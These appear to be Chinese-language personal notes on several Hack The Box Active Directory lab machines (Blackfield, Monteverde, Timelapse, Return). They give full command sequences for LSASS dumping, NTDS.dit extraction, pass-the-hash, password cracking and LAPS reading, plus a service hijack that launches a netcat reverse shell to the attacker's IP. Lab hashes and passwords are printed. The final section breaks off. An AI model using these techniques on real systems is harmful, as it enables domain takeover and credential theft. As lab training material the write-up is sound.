memory_analysis是windows一些内存转存文件，扔给GPT，说`lsass.zip`中可能含有凭证，下载下来

![image-20250205214506099](./HTB_Active_Directory.assets/image-20250205214506099.png)

DMP文件可以用`pypykatz`工具来进行破解

```
pypykatz lsa minidump lsass.DMP
```

![image-20250205214825691](./HTB_Active_Directory.assets/image-20250205214825691.png)

拿走NTLM

```
┌──(root㉿cyborg)-[/home/cyborg/桌面]
└─# pypykatz lsa minidump lsass.DMP
INFO:pypykatz:Parsing file lsass.DMP
FILE: ======== lsass.DMP =======
== LogonSession ==
authentication_id 406458 (633ba)
session_id 2
username svc_backup
domainname BLACKFIELD
logon_server DC01
logon_time 2020-02-23T18:00:03.423728+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-1413
luid 406458
        == MSV ==
                Username: svc_backup
                Domain: BLACKFIELD
                LM: NA
                NT: 9658d1d1dcd9250115e2205d9f48400d
                SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
                DPAPI: a03cd8e9d30171f3cfe8caad92fef62100000000
        == WDIGEST [633ba]==
                username svc_backup
                domainname BLACKFIELD
                password None
                password (hex)
        == Kerberos ==
                Username: svc_backup
                Domain: BLACKFIELD.LOCAL
        == WDIGEST [633ba]==
                username svc_backup
                domainname BLACKFIELD
                password None
                password (hex)

== LogonSession ==
...
```

偷懒直接登录administrator失败了，使用svc_backup登录

```
evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
```

![image-20250205215535840](./HTB_Active_Directory.assets/image-20250205215535840.png)

拿到flag1

继续查看用户权限

```
whoami /priv
```

![image-20250207094953571](./HTB_Active_Directory.assets/image-20250207094953571.png)

直接发给GPT：

>  `whoami /priv` 结果显示你拥有 `SeBackupPrivilege` 和 `SeRestorePrivilege`，这意味着你可以利用 **备份和恢复** 权限读取**敏感文件**，例如 `NTDS.dit`，然后提取域控的哈希，甚至尝试本地提权。
>
>  其中有一个方案是：
>
>  > ***利用SeBackupPrivilege权限进行NTDS.dt卷影拷贝实现权限提升***
>
>  攻击的步骤大概分三步 
>
>  - 获取文件副本，`NTDS.dit`即存储 Active Directory 用户凭据的数据库。 
>  - 接下来，我们将获取 SYSTEM hive 文件，其中包含解密 NTDS.dit 所必需的系统启动密钥 
>  - 使用 Impacket 的 secretsdump 脚本从 NTDS.dit 中提取域中所有用户的 NTLM 哈希

有一个专门利用该方法提权的工具：

https://github.com/giuliano108/SeBackupPrivilege

上传所需dll

![image-20250207102204178](./HTB_Active_Directory.assets/image-20250207102204178.png)

然后加载

```
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```

![image-20250207102313687](./HTB_Active_Directory.assets/image-20250207102313687.png)



创建一个test.dsh文件

```
set context persistent nowriters
set metadata c:\Users\svc_backup\\test.cab        
set verbose on
add volume c: alias test
create
expose %test% z:
```

Linux往Windows传一定要转换格式

```
unix2dos test.dsh
```

运行然后就可以复制想要的文件了

```
diskshadow /s c:\\Users\\svc_backup\\test.dsh
```

![image-20250207103459230](./HTB_Active_Directory.assets/image-20250207103459230.png)

复制ntds.dit文件到目录下

> (PS:直接去Z盘cat了一下flag，果然权限不够)
>
> ```
> *Evil-WinRM* PS Z:\Users\Administrator\Desktop> cat root.txt
> Access to the path 'Z:\Users\Administrator\Desktop\root.txt' is denied.
> At line:1 char:1
> + cat root.txt
> + ~~~~~~~~~~~~
>     + CategoryInfo          : PermissionDenied: (Z:\Users\Administrator\Desktop\root.txt:String) [Get-Content], UnauthorizedAccessException
>     + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
> ```

```
Copy-FileSeBackupPrivilege z:\\Windows\\ntds\\ntds.dit c:\\Users\\svc_backup\\ntds.dit
```

![image-20250207122439938](./HTB_Active_Directory.assets/image-20250207122439938.png)

还需要ntds.dit解密密钥，位于注册表HKLM\SYSTEM中

```
reg save hklm\system \SYSTEM.hiv
```



在使用secretsdump拿到administrator的hash

```text
impacket-secretsdump -system SYSTEM.hiv -ntds ntds.dit LOCAL
```

![image-20250207133101038](./HTB_Active_Directory.assets/image-20250207133101038.png)

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:7f82cc4be7ee6ca0b417c0719479dbec:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
audit2020:1103:aad3b435b51404eeaad3b435b51404ee:600a406c2c1f2062eb9bb227bad654aa:::
support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::
```

PTH即可

```
impacket-wmiexec BLACKFIELD.local/administrator@10.10.10.192 -hashes aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee
```

拿到flag2

![image-20250207133405782](./HTB_Active_Directory.assets/image-20250207133405782.png)



## Monteverde

信息收集：

```
┌──(root㉿cyborg)-[~]
└─# nmap -sS -p- -A 10.10.10.172 -T4
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-09 10:53 CST
Nmap scan report for 10.10.10.172
Host is up (0.42s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-02-09 04:03:19Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  msrpc         Microsoft Windows RPC
49747/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-02-09T04:04:31
|_  start_date: N/A
|_clock-skew: 59m57s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

TRACEROUTE (using port 445/tcp)
HOP RTT       ADDRESS
1   295.43 ms 10.10.16.1
2   531.07 ms 10.10.10.172

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 728.20 seconds
```

找到域：MEGABANK.LOCAL，smb:

```
smbclient -L //10.10.10.172 -N
```

![image-20250209112616596](./HTB_Active_Directory.assets/image-20250209112616596.png)

ldapsearch:

```
ldapsearch -x -b "dc=MEGABANK,dc=LOCAL" -H ldap://10.10.10.172
```

![image-20250209113127583](./HTB_Active_Directory.assets/image-20250209113127583.png)

根据向导模式，下一步是找到`AD Connect 同步服务的服务帐户的用户名`

通过rpcclient获取用户名

![image-20250209114202929](./HTB_Active_Directory.assets/image-20250209114202929.png)

尝试GetNPUsers

```
impacket-GetNPUsers MEGABANK.LOCAL/ -dc-ip 10.10.10.172 -no-pass -usersfile '/root/swap/htb_swap/ad_monteverde_user.txt'
```

![image-20250209114126819](./HTB_Active_Directory.assets/image-20250209114126819.png)

无果，梳理前面的信息，知道了部分用户名，根据下一问hint，有一个用户使用了和用户名相同的密码

```
netexec smb 10.10.10.172 -u ~/swap/htb_swap/ad_monteverde_user.txt -p ~/swap/htb_swap/ad_monteverde_user.txt
```

![image-20250209122629144](./HTB_Active_Directory.assets/image-20250209122629144.png)

找到一个用户的密码

```
MEGABANK.LOCAL\SABatchJobs:SABatchJobs 
```



使用该用户登录smb共享看看有没有东西，先确定有哪些目录的权限

```
smbmap -u 'SABatchJobs' -p 'SABatchJobs' -H 10.10.10.172
```

![image-20250209122907915](./HTB_Active_Directory.assets/image-20250209122907915.png)

在user$文件夹，mhope目录下找到xml文件，拿出来查看

![image-20250209123504950](./HTB_Active_Directory.assets/image-20250209123504950.png)

![image-20250209123542382](./HTB_Active_Directory.assets/image-20250209123542382.png)

> 之前的tips:windows的加密凭证会存在xml文件中
>

拿到用户名密码

用户：mhope

密码：4n0therD4y@n0th3r$

查看5985端口为开放，evil-winrm连上去拿到flag1

```
evil-winrm -i 10.10.10.172 -u mhope
```

![image-20250209124205096](./HTB_Active_Directory.assets/image-20250209124205096.png)

继续使用bloodhound域信息收集

```
bloodhound-python -u mhope -p '4n0therD4y@n0th3r$' -d MEGABANK.LOCAL -ns 10.10.10.172 -c DcOnly
```

![image-20250209130009427](./HTB_Active_Directory.assets/image-20250209130009427.png)

确认了mhope是Azure Admins组的，用下面的whoami命令也可以确认

```
whoami /priv
whoami /groups
```

![image-20250209125908058](./HTB_Active_Directory.assets/image-20250209125908058.png)

后面的思路就是利用Azure AD提权，根据文章：

https://blog.xpnsec.com/azuread-connect-for-redteam/

但是文章的PS脚本不能直接用，需要把

```
$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync"
更改为
$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=127.0.0.1;Database=ADSync;Integrated Security=True"
```

![image-20250209133219288](./HTB_Active_Directory.assets/image-20250209133219288.png)

拿到域管理员密码

Domain: MEGABANK.LOCAL
Username: administrator
Password: d0m@in4dminyeah!

```
evil-winrm -i 10.10.10.172 -u administrator -p d0m@in4dminyeah!
```

拿到flag2

![image-20250209133403359](./HTB_Active_Directory.assets/image-20250209133403359.png)



## Timelapse

信息收集

```
┌──(root㉿cyborg)-[~]
└─# nmap -sS -A 10.10.11.152 -p- -T4
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-10 20:08 CST
Nmap scan report for 10.10.11.152
Host is up (0.62s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus                                                                                        
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2025-02-10 20:00:58Z)                                         
135/tcp   open  msrpc             Microsoft Windows RPC                                                                                  
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn                                                                          
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)       
445/tcp   open  microsoft-ds?                                                                                                            
464/tcp   open  kpasswd5?                                                                                                                
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0                                                                    
636/tcp   open  ldapssl?                                                                                                                 
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)       
3269/tcp  open  globalcatLDAPssl?                                                                                                        
5986/tcp  open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                                                
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Not valid before: 2021-10-25T14:05:29
|_Not valid after:  2022-10-25T14:25:29
|_http-title: Not Found
| tls-alpn: 
|_  http/1.1
|_ssl-date: 2025-02-10T20:03:37+00:00; +7h43m11s from scanner time.
9389/tcp  open  mc-nmf            .NET Message Framing
49667/tcp open  msrpc             Microsoft Windows RPC
49673/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc             Microsoft Windows RPC
49692/tcp open  msrpc             Microsoft Windows RPC
49727/tcp open  msrpc             Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-02-10T20:02:19
|_  start_date: N/A
|_clock-skew: mean: 7h43m10s, deviation: 0s, median: 7h43m10s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

TRACEROUTE (using port 139/tcp)
HOP RTT       ADDRESS
1   429.80 ms 10.10.16.1
2   617.67 ms 10.10.11.152

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 725.31 seconds
```

smbclient

```
smbclient -L //10.10.11.152 -N
```

![image-20250210202914464](./HTB_Active_Directory.assets/image-20250210202914464.png)

有东西，使用smbmap进一步查看下目录权限

![image-20250210203009317](./HTB_Active_Directory.assets/image-20250210203009317.png)

只可以查看IPC$和Shares目录，首先看下Shares，开启树状查看

```
smbclient //10.10.11.152/Shares -N
```

![image-20250210203145117](./HTB_Active_Directory.assets/image-20250210203145117.png)

发现一个有意思的zip：winrm_backup.zip，下载下来

![image-20250210203704082](./HTB_Active_Directory.assets/image-20250210203704082.png)

解压的时候发现有密码，里面有一个文件legacyy_dev_auth.pfx

![image-20250210203736715](./HTB_Active_Directory.assets/image-20250210203736715.png)

针对这个文件，问了下GPT，回答如下

> - **PFX (PKCS#12) 主要用于存储加密证书和私钥**，通常用于身份验证或安全通信（如 SSL/TLS 证书）。
>
> - `legacyy_dev_auth` 这个名字暗示它可能是 **一个旧的（legacy）开发者认证（dev_auth）证书**，可能用于身份验证、签名代码，或者用于访问某些受保护的资源。
> - PFX 文件通常受到 **密码保护**，你需要密码才能解密其中的内容。

使用john破解

```
zip2john winrm_backup.zip > ziphash.txt
john --wordlist=~/rockyou.txt ziphash.txt
```

![image-20250210204316938](./HTB_Active_Directory.assets/image-20250210204316938.png)

![image-20250210204306846](./HTB_Active_Directory.assets/image-20250210204306846.png)

拿到密码：supremelegacy

![image-20250210204406201](./HTB_Active_Directory.assets/image-20250210204406201.png)

查看证书，也需要密码，而且密码还不是zip解压密码

![image-20250210204617180](./HTB_Active_Directory.assets/image-20250210204617180.png)

继续使用john爆破

```
pfx2john legacyy_dev_auth.pfx > pfxhash.txt
john --wordlist=~/rockyou.txt pfxhash.txt
```

![image-20250210204706587](./HTB_Active_Directory.assets/image-20250210204706587.png)

拿到密码：thuglegacy，下面提取公私钥都需要密码，也都是这个密码

```
┌──(root㉿cyborg)-[~/swap/htb_swap/ad_Timelapse]
└─# openssl pkcs12 -info -in legacyy_dev_auth.pfx
Enter Import Password:
MAC: sha1, Iteration 2000
MAC length: 20, salt length: 20
PKCS7 Data
Shrouded Keybag: pbeWithSHA1And3-KeyTripleDES-CBC, Iteration 2000
Bag Attributes
    Microsoft Local Key set: <No Values>
    localKeyID: 01 00 00 00 
    friendlyName: te-4a534157-c8f1-4724-8db6-ed12f25c2a9b
    Microsoft CSP Name: Microsoft Software Key Storage Provider
Key Attributes
    X509v3 Key Usage: 90 
Enter PEM pass phrase:
Verifying - Enter PEM pass phrase:
-----BEGIN ENCRYPTED PRIVATE KEY-----
MIIFNTBfBgkqhkiG9w0BBQ0wUjAxBgkqhkiG9w0BBQwwJAQQe1UYRJP7elz9AM3t
L7FiKAICCAAwDAYIKoZIhvcNAgkFADAdBglghkgBZQMEASoEELkvF9MjBKmK54mK
fpomXj8EggTQrooV/xK099ZGk6nozjB+Dq9PMkaPHtq7YRz6jYSf4mJ7Q/F6+ZGP
kK0Xj08fkvf6p6qwNZb/eUQdMKtYZLSIyPTO2WcBtc2h+oDmwHvKzauIXjYNbQR8
4QQlbtTmrk9DoKSR5UKmRnvf/jDg3R3FhzdvxiCzqKf7vgSThEPqFaatnLnoK2nH
uigx35JhjUkHfGRD6lfSg2imMTF4ErxUgPNtX0kwBeLhSnIMNVQXkgxus0Eq69Jx
QVUlNg0GbXzXBJrJt4ACQL6pjDX37eugwocbXV3MrJ1BrHJxkx0I0eEUu5znqkRM
DEEVbBw6tQHlw3EsWpDlEkf+eMI03PXEahOTSPVQNhJyrso7spGifwbs/pjiTlyu
CHRY6Glu81ZPFjGVQqO9p5aIWLMyLtF7zP2FNnCQiB2W7E08KiENnoI+sLi9044X
DcAXvZypYYYvcSY7dY9Ph0mkoMevTOnYOAhmHX6A+nNkwDF+1Z4w9P7OMiK657XC
VsONaap9DAeSfEsuZfdeH/n/R1Kbhfvb+Fk7iZy1UqA5fPWjBRWhYHUDSPt+hu2o
+fw9yL7ekoWy5ZD49FvwUFseweAzVtu87Wu7DTUkb/F8v2/lW3bB1eVZ2bhoRw1M
T5HO3DRfbeZLy32LQ1YZh0568mFUQl2UWb2IILNJZ6HsukRHl6JQBEvczHjJjRKc
rqW77UWPcqj6LgwTI29aQB22Gx33aZYJdcAIMZ07/J2GpaibpnyJJxqt7K0Z+js3
yM3cEeS1MJE5a0JgYfySSNV0LZzACPeLIyY0iVocEXM4QH2rscwtcd3TlSgaX9Xp
Ru6ewN/QoBTfwor1QVjqvBY3Wk3xcm4mLs9IvWl3LxVXgccYj95IyReXL1oVGKfs
rPAMC4AeRkMxT7OsHvoerAfpeJHp+UpitNOPrtFd8ryDmcchDli3TqAD4UDltIy2
0i9QJutrJBlcIadbkTkVqBvFkjSkfLZdLxLVevYvzlwHo2OC4qGEAnDpLUDrYOyy
lni+64Sx5RgPQ6RwnVq5JG+W4Rs+JaTaJk8pGyYkhhO7b64xmbuzhDpoJlA5B4/O
VRRNXV/C54uAC7XuT0sq/W7Doz9XZlKt/nd+aLeDIpSEKmBq1iRmgzrshl7TXohN
zO0rkdfc6khh8cgJy03omwAG2Xk5QgDWj3+aglcrHWF6vXhpgLWwmj414ZS68Ggn
yfuFnBAEHWbRVo841Rdynl6n6vApHPLBzHwyO8KKD++1s7JoD+7p1dJz3dNdC+fA
myMODqLJ3MlBAurDcU+MmXLP4BZLKqN5zodHduvIyXwt29Puo8wJZvwmDj5c7VYL
938Ban2WaGb8WuOpdlxtQucjH/JKeNjXJiAd3F3JuEC0oxdjhceQeN+J8kk0qOKd
lQAsrYi8m1wqgdjDYKJJmtBIfm2pHwdNFrYnZc6GZguzCj2/W8JJs4ZV+jaTnnp3
cVj7PmbqFVcFNHwu3FnNQWJoAD8u61RvQ6A2vEWwiNxtdn1Dxn70mEmG7T6CzOD3
5nBXiDD+MtFH+f6V7MtWLk197DkzIpiHfQFSoSsuVzXzcGlLwuHpgy6qOsG59Nyw
TXYINUS3aVGYRaCSm7FtSbkuxg6+AHi1l4zU9a82oV6HYnkq0wORlTo=
-----END ENCRYPTED PRIVATE KEY-----
PKCS7 Data
Certificate bag
Bag Attributes
    localKeyID: 01 00 00 00 
subject=CN=Legacyy
issuer=CN=Legacyy
-----BEGIN CERTIFICATE-----
MIIDJjCCAg6gAwIBAgIQHZmJKYrPEbtBk6HP9E4S3zANBgkqhkiG9w0BAQsFADAS
MRAwDgYDVQQDDAdMZWdhY3l5MB4XDTIxMTAyNTE0MDU1MloXDTMxMTAyNTE0MTU1
MlowEjEQMA4GA1UEAwwHTGVnYWN5eTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCC
AQoCggEBAKVWB6NiFkce4vNNI61hcc6LnrNKhyv2ibznhgO7/qocFrg1/zEU/og0
0E2Vha8DEK8ozxpCwem/e2inClD5htFkO7U3HKG9801NFeN0VBX2ciIqSjA63qAb
YX707mBUXg8Ccc+b5hg/CxuhGRhXxA6nMiLo0xmAMImuAhJZmZQepOHJsVb/s86Z
7WCzq2I3VcWg+7XM05hogvd21lprNdwvDoilMlE8kBYa22rIWiaZismoLMJJpa72
MbSnWEoruaTrC8FJHxB8dbapf341ssp6AK37+MBrq7ZX2W74rcwLY1pLM6giLkcs
yOeu6NGgLHe/plcvQo8IXMMwSosUkfECAwEAAaN4MHYwDgYDVR0PAQH/BAQDAgWg
MBMGA1UdJQQMMAoGCCsGAQUFBwMCMDAGA1UdEQQpMCegJQYKKwYBBAGCNxQCA6AX
DBVsZWdhY3l5QHRpbWVsYXBzZS5odGIwHQYDVR0OBBYEFMzZDuSvIJ6wdSv9gZYe
rC2xJVgZMA0GCSqGSIb3DQEBCwUAA4IBAQBfjvt2v94+/pb92nLIS4rna7CIKrqa
m966H8kF6t7pHZPlEDZMr17u50kvTN1D4PtlCud9SaPsokSbKNoFgX1KNX5m72F0
3KCLImh1z4ltxsc6JgOgncCqdFfX3t0Ey3R7KGx6reLtvU4FZ+nhvlXTeJ/PAXc/
fwa2rfiPsfV51WTOYEzcgpngdHJtBqmuNw3tnEKmgMqp65KYzpKTvvM1JjhI5txG
hqbdWbn2lS4wjGy3YGRZw6oM667GF13Vq2X3WHZK5NaP+5Kawd/J+Ms6riY0PDbh
nx143vIioHYMiGCnKsHdWiMrG2UWLOoeUrlUmpr069kY/nn7+zSEa2pA
-----END CERTIFICATE-----
```

然后提取出私钥和证书

```
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes
openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out cert.pem
```

![image-20250210205605805](./HTB_Active_Directory.assets/image-20250210205605805.png)

使用evil-winrm登录windows，-S表示SSL连接

```
evil-winrm -i 10.10.11.152 -c certificate.pem -k private_key.pem -S
```

拿到flag1

![image-20250210210554405](./HTB_Active_Directory.assets/image-20250210210554405.png)

进一步提权信息收集看了hints，需要查看powershell历史命令

> 在 Windows 系统中，PowerShell 的历史记录通常保存在以下位置：
>
> 1. **PowerShell 7 或更高版本：** 历史记录文件位于：
>
>    ```
>    $env:USERPROFILE\Documents\PowerShell\history.txt
>    ```
>
> 2. **Windows PowerShell 5.1（和更早版本）：** 历史记录文件位于：
>
>    ```
>    $env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
>    ```
>
> 你可以在 PowerShell 中使用以下命令来打印历史记录文件路径：
>
> ```
> echo $env:USERPROFILE\Documents\PowerShell\history.txt
> ```
>
> 或者（貌似只有下面能用）：
>
> ```
> echo $env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
> ```
>
> 这将返回对应的历史记录文件路径。

查看靶机powershell历史命令

![image-20250210211119764](./HTB_Active_Directory.assets/image-20250210211119764.png)

历史命令里找到了一个用户的账号密码

svc_deploy/E3R$Q62^12p7PLlC%KWaxuaV

尝试使用该用户连接windows，还是得-S使用SSL登录

```
evil-winrm -i 10.10.11.152 -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
```

查看用户组，有一个组值得注意：LAPS_Readers

**方法一：**

https://github.com/ztrhgf/LAPS/tree/master/AdmPwd.PS

使用该工具的PS文件读取administrator密码，首先上传AdmPwd.PS，导入

```
Import-Module "C:\Users\svc_deploy\Desktop\AdmPwd.PS\AdmPwd.PS.psd1"
Find-AdmPwdExtendedRights -identity *
Find-AdmPwdExtendedRights -identity 'Domain Controllers' | select-object ExtendedRightHolders
get-admpwdpassword -computername dc01 | Select password
```

![image-20250210233900981](./HTB_Active_Directory.assets/image-20250210233900981.png)

**方法二(建议/方便省事)：**

```
input:
Get-ADComputer -Filter * | Select-Object Name
output:
Name
----
DC01
DB01
WEB01
DEV01

------
Get-ADComputer -Identity DC01 -Properties ms-Mcs-AdmPwd | Select-Object ms-Mcs-AdmPwd
```

![image-20250210234232105](./HTB_Active_Directory.assets/image-20250210234232105.png)

方法三(pyLAPS)：

https://github.com/p0dalirius/pyLAPS/blob/main/pyLAPS.py#L18

```
python3 pyLAPS.py -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' -d timelapse.htb 
```

![image-20250210234943586](./HTB_Active_Directory.assets/image-20250210234943586.png)



拿到管理员密码：{98Xa+;@RBJ8@03HUo7h(aF#

```
evil-winrm -i 10.10.11.152 -u 'administrator' -p '{98Xa+;@RBJ8@03HUo7h(aF#' -S
```

拿到flag2(居然不在administrator的桌面而在用户TRX的桌面)

![image-20250210235107650](./HTB_Active_Directory.assets/image-20250210235107650.png)

> 记录两个windows powershell查找文件的命令(查找root.txt为例)
>
> ```
> Get-ChildItem -Path C:\ -Recurse -Filter "root.txt" -ErrorAction SilentlyContinue
> dir C:\root.txt -Recurse -ErrorAction SilentlyContinue
> ```

![image-20250210235713818](./HTB_Active_Directory.assets/image-20250210235713818.png)



## Return

信息收集，网络出了点问题，暂时没加-p-先看

```
┌──(root㉿cyborg)-[~/tools]
└─# nmap -sS -A -T4 10.10.11.108    
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-09 19:52 CST
Nmap scan report for 10.10.11.108
Host is up (1.4s latency).
Not shown: 987 closed tcp ports (reset)
PORT     STATE SERVICE        VERSION
53/tcp   open  domain         Simple DNS Plus
80/tcp   open  http           Microsoft-IIS/10.0
|_http-title: HTB Printer Admin Panel
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec?
135/tcp  open  msrpc?
139/tcp  open  netbios-ssn?
389/tcp  open  ldap?
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http     Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  globalcatLDAP?
3269/tcp open  tcpwrapped
5985/tcp open  wsman?
OS fingerprint not ideal because: Didn't receive UDP response. Please try again with -sSU
No OS matches for host
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-02-09T12:11:52
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 18m34s

TRACEROUTE (using port 587/tcp)
HOP RTT    ADDRESS
1   ... 30

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 148.24 seconds
```



smb匿名登录没有有用的东西

```
smbclient -L //10.10.11.108 -N
```

![image-20250209201332048](./HTB_Active_Directory.assets/image-20250209201332048.png)

注意到80端口开放了HTB Printer Admin Panel

![image-20250209200156043](./HTB_Active_Directory.assets/image-20250209200156043.png)

在setting页面找到了域名信息，并且知道了username，但是密码被隐藏了，而且f12直接是text格式的*

![image-20250209200755777](./HTB_Active_Directory.assets/image-20250209200755777.png)

printer.return.local

猜测隶属于域：return.local，知道了域名就可以使用ldapsearch

```
ldapsearch -x -b "dc=return,dc=local" -H ldap://10.10.11.108
```

无法匿名登录....

也只有setting可以点进去了，用bp抓包看下传参

![image-20250209203055350](./HTB_Active_Directory.assets/image-20250209203055350.png)

只传了IP，那证明其他的都是静态放在那的，看了下hints，居然更改IP为自己的，然后监听本地389端口就收到了？(第一眼真没看出来，应该是这种域打印机特性

> 官方解释：
>
> 这些设备存储 LDAP 和 SMB 凭证，以便打印机从 Active 查询用户列表目录，并能够将扫描的文件保存到用户驱动器。这些配置页面通常允许
>
> 要指定的域控制器或文件服务器。让我们在端口 389 （LDAP） 上建立一个侦听器，并指定我们的服务器地址字段中的 tun0 IP 地址。
>
> > To this , we need to the MFP to use a IP for the LDAP . , the IP needs to be under our and on port 389 ( LDAP). When the MFP makes an LDAP query, it the back to us in .
> >
> > 当把 字段换成一个我们可以控制的机器，ldap服务就会以明文返回一个管理密码

![image-20250209203225680](./HTB_Active_Directory.assets/image-20250209203225680.png)

然后就拿到了一个域用户名和密码

```
svc-printer
1edFg43012!!
```

然后evil-winrm登录很轻松拿到flag1，对了我还把hosts文件改了，把打印机的域名和IP对应了下访问的

![image-20250209203625156](./HTB_Active_Directory.assets/image-20250209203625156.png)

~~下一步上组合拳bloodhound~~

```
bloodhound-python -u svc-printer -p '1edFg43012!!' -d return.local -ns 10.10.11.108 -c DcOnly
```

翻了半天没什么头绪，有去看WP了

```
net user svc-printer
```

查看用户权限，需要注意这个

![image-20250209205343496](./HTB_Active_Directory.assets/image-20250209205343496.png)

`Server Operators` 组可以启动或关闭本地服务，可以利用***服务配置劫持***提权

首先上传netcat(nc)到windows靶机，需要挑选一个有特权的服务**修改它的二进制路径**，即Privileges为True，注意别挑影响太大的
```
services
```

![image-20250209210554374](./HTB_Active_Directory.assets/image-20250209210554374.png)

PS:一开始用的PerfHost，关闭时候都好着，启动时候来个权限不足...

```
sc.exe config VMTools binPath="C:\Users\svc-printer\Desktop\nc.exe -e cmd.exe 10.10.16.2 9001"
```

然后重启该服务

```
sc.exe stop VMTools
sc.exe start VMTools
```

![image-20250209211235419](./HTB_Active_Directory.assets/image-20250209211235419.png)

在弹回来的shell中拿到flag2

![image-20250209211336116](./HTB_Active_Directory.assets/image-20250209211336116.png)



## Cascade

信息收集：

```
┌──(root㉿cyborg)-[~]
└─# nmap -sS -A 10.10.10.182 -p- -T4
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-11 14:11 CST
Nmap scan report for 10.10.10.182
Host is up (0.25s latency).
Not shown: 65520 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
